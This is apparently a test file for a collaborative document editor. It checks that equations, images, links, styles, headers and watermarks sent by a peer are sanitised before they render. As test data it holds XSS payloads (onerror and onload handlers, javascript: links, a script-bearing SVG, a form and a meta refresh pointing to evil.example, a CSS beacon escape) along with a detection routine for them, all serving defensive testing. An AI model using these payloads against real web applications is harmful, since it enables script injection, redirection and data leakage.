import { parseDocx } from '@genoffice/docx-engine'
import { MAX_CHANGE_BYTES, type CollabAdapter, type Json } from '@seuoffice/collab/client'
import { Editor } from '@tiptap/core'
import { readdirSync, readFileSync } from 'node:fs'
import { join } from 'node:path'
import { afterEach, beforeAll, describe, expect, it } from 'vitest'
import { buildDocx } from '../../../packages/docx-engine/tests/helpers/build-docx'
import { blocksToPmDoc, type PmNode as PmNodeJson } from '../src/renderer/editor/convert'
import { equationBlockJson, inlineEquationNodeJson } from '../src/renderer/editor/equation'
import { editorExtensions } from '../src/renderer/editor/extensions'
import { createDocsAdapter, type DocsOp, type SideStore } from '../src/web/collab-adapter'
import { safeNode } from '../src/web/collab-safety'

const para = (text: string) => `<w:p><w:r><w:t xml:space="preserve">${text}</w:t></w:r></w:p>`

let content: unknown
const editors: Editor[] = []

beforeAll(async () => {
  content = blocksToPmDoc(
    (await parseDocx(await buildDocx({ bodyXml: para('alpha beta') }))).blocks,
  )
})

afterEach(() => {
  for (const editor of editors.splice(0)) editor.destroy()
})

interface Page {
  editor: Editor
  adapter: CollabAdapter<DocsOp>
  sent: DocsOp[]
}

function page(): Page {
  const editor = new Editor({
    element: document.createElement('div'),
    extensions: editorExtensions,
    content: content as never,
  })
  editors.push(editor)
  let entries = new Map<string, Json>()
  const side: SideStore = {
    read: () => new Map(entries),
    write: ({ entries: changed }) => {
      entries = new Map(entries)
      for (const [key, value] of changed) {
        if (value === null) entries.delete(key)
        else entries.set(key, value)
      }
    },
    observe: () => () => {},
  }
  const adapter = createDocsAdapter({
    editor,
    side,
    produce: async () => ({ fileName: 'memo.docx', bytes: new Uint8Array() }),
    maxOpBytes: MAX_CHANGE_BYTES - 4096,
  })
  const sent: DocsOp[] = []
  adapter.listen((ops) => sent.push(...ops))
  return { editor, adapter, sent }
}

/** `to` takes `ops` from `from` over the wire */
const carry = (ops: DocsOp[], from: Page, to: Page) =>
  to.adapter.integrate(
    ops.map((op) => to.adapter.decode(from.adapter.encode(op))),
    [],
  )

/** insert `nodes` (JSON) after "alpha", as a peer's editor would send them */
function insert(p: Page, nodes: Json[], block = false): DocsOp[] {
  const editor = p.editor
  let pos = -1
  editor.state.doc.descendants((node, at) => {
    if (pos < 0 && node.isTextblock) pos = block ? at + node.nodeSize : at + 1 + 'alpha'.length
    return pos < 0
  })
  const fragment = nodes.map((json) => editor.schema.nodeFromJSON(json))
  editor.view.dispatch(editor.state.tr.insert(pos, fragment))
  return p.sent.splice(0)
}

const HOSTILE_MARKUP =
  '<style>body{display:none}</style><form action="https://evil.example/"><input name="p"></form>' +
  '<img src="x" onerror="alert(1)"><meta http-equiv="refresh" content="0;url=https://evil.example/">' +
  '<a href="javascript:alert(1)">x</a>'
const HOSTILE_SVG =
  'data:image/svg+xml,' +
  encodeURIComponent(
    '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(1)</script></svg>',
  )
const PNG =
  'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=='
const STYLE_ESCAPE = '000;position:fixed;inset:0;background:url(https://evil.example/beacon)'

/** a node as the JSON a step carries */
type NodeJson = { type: string; attrs: { [key: string]: Json }; [key: string]: Json }
const asJson = (node: PmNodeJson): NodeJson => JSON.parse(JSON.stringify(node)) as NodeJson

/** what a hostile peer can make the receiving editor draw */
function hostile(): { inline: Json[]; block: Json[] } {
  const equation = asJson(inlineEquationNodeJson('x^2'))
  const display = asJson(equationBlockJson('y^2'))
  const formula = display.attrs.formulaDisplay as { [key: string]: Json }
  return {
    inline: [
      { ...equation, attrs: { ...equation.attrs, mathml: HOSTILE_MARKUP } },
      { type: 'docInlineImage', attrs: { dataUrl: HOSTILE_SVG, widthPx: 10, heightPx: 10 } },
      {
        type: 'docInlineImage',
        attrs: { dataUrl: 'data:image/svg+xml,<svg onload=alert(1)>', widthPx: 10, heightPx: 10 },
      },
      {
        type: 'text',
        text: 'link',
        marks: [
          { type: 'link', attrs: { href: 'javascript:alert(1)' } },
          { type: 'docTextStyle', attrs: { color: STYLE_ESCAPE, font: 'x";position:fixed;"' } },
        ],
      },
    ],
    block: [
      {
        ...display,
        attrs: { ...display.attrs, formulaDisplay: { ...formula, mathml: HOSTILE_MARKUP } },
      },
    ],
  }
}

/** every way the hostile values above could show in a page */
function threats(editor: Editor): string[] {
  const dom = editor.view.dom
  const found: string[] = []
  for (const element of dom.querySelectorAll('style, form, meta, script, input, iframe'))
    found.push(`<${element.localName}>`)
  for (const element of [dom, ...dom.querySelectorAll('*')]) {
    for (const { name, value } of element.attributes) {
      if (/^on/i.test(name)) found.push(`${name} on <${element.localName}>`)
      if (/href$/i.test(name) && /^\s*javascript:/i.test(value)) found.push(`${name}=${value}`)
      if (name === 'src' && value.startsWith('data:image/svg')) found.push('svg src')
      if (name === 'style' && /url\(|position:\s*fixed/i.test(value)) found.push(`style=${value}`)
    }
  }
  return found
}

describe('a peer’s step carrying markup, scripts and style escapes', () => {
  it('shows none of it on the pages that receive it, and they agree', async () => {
    const alice = page()
    const bob = page()
    const carol = page()
    const { inline, block } = hostile()
    const ops = [...insert(alice, inline), ...insert(alice, block, true)]
    expect(threats(alice.editor).length).toBeGreaterThan(0)
    for (const to of [bob, carol]) carry(ops, alice, to)
    expect(threats(bob.editor)).toEqual([])
    expect(threats(carol.editor)).toEqual([])
    // the equations still draw: their markup is rebuilt from their OMML
    expect(bob.editor.view.dom.querySelectorAll('math').length).toBe(2)
    const fingerprint = await bob.adapter.fingerprint()
    expect(await carol.adapter.fingerprint()).toBe(fingerprint)
    // the page that made them vouches for the same state
    alice.adapter.confirmed?.(ops)
    expect(await alice.adapter.fingerprint()).toBe(fingerprint)
  })

  it('still shows a peer’s equation, link and picture', async () => {
    const alice = page()
    const bob = page()
    const ops = [
      ...insert(alice, [
        asJson(inlineEquationNodeJson('a+b')),
        {
          type: 'text',
          text: 'site',
          marks: [{ type: 'link', attrs: { href: 'https://example.com/' } }],
        },
        { type: 'docInlineImage', attrs: { dataUrl: PNG, widthPx: 10, heightPx: 10 } },
      ]),
    ]
    carry(ops, alice, bob)
    const dom = bob.editor.view.dom
    expect(dom.querySelector('math')).not.toBeNull()
    expect(dom.querySelector('a[href="https://example.com/"]')).not.toBeNull()
    expect(dom.querySelector(`img[src="${PNG}"]`)).not.toBeNull()
    expect(bob.editor.state.doc.toJSON()).toEqual(alice.editor.state.doc.toJSON())
  })
})

/** an outside-state entry as a page receives it from a peer */
function received(key: string, value: Json): Json {
  const op = page().adapter.decode({ kind: 'side', key, value })
  if (op.kind !== 'side') throw new Error('not a side op')
  return op.value
}

describe('a peer’s outside-state entries', () => {
  it('lose the links, pictures and style escapes headers, watermarks and comments could draw', () => {
    const header = received('header', {
      header: {
        text: 'Title',
        paras: [
          {
            runs: [
              { text: 'a', color: STYLE_ESCAPE, link: { href: 'javascript:alert(1)' } },
              { text: 'b', image: { dataUrl: HOSTILE_SVG, widthPx: 'x"><style>' } },
            ],
          },
        ],
      },
      headerDirty: true,
    })
    expect(header).toEqual({
      header: {
        text: 'Title',
        paras: [
          {
            runs: [
              { text: 'a', color: '', link: { href: '' } },
              { text: 'b', image: { dataUrl: '', widthPx: '' } },
            ],
          },
        ],
      },
      headerDirty: true,
    })
    expect(
      received('watermark', {
        watermark: 'DRAFT',
        watermarkStyle: { fontFamily: 'x";position:fixed', colorHex: 'C0C0C0' },
        watermarkPicture: { dataUrl: 'javascript:alert(1)' },
      }),
    ).toEqual({
      watermark: 'DRAFT',
      watermarkStyle: { fontFamily: '', colorHex: 'C0C0C0' },
      watermarkPicture: { dataUrl: '' },
    })
    // a comment's words and author stay as written
    const comment = { id: '5', author: "O'Brien", text: 'see <b>this</b>; "quoted"' }
    expect(received('comment:5', comment)).toEqual(comment)
  })
})

describe('what the app itself makes', () => {
  it('passes every document of the pagination corpus unchanged', async () => {
    const dir = join(__dirname, 'pagination-corpus/docx')
    let checked = 0
    for (const name of readdirSync(dir).filter((file) => file.endsWith('.docx'))) {
      const parsed = await parseDocx(new Uint8Array(readFileSync(join(dir, name))))
      const doc = asJson(blocksToPmDoc(parsed.blocks))
      expect(safeNode(doc, {}), name).toBe(doc)
      checked++
    }
    expect(checked).toBeGreaterThan(10)
  }, 120_000)
})
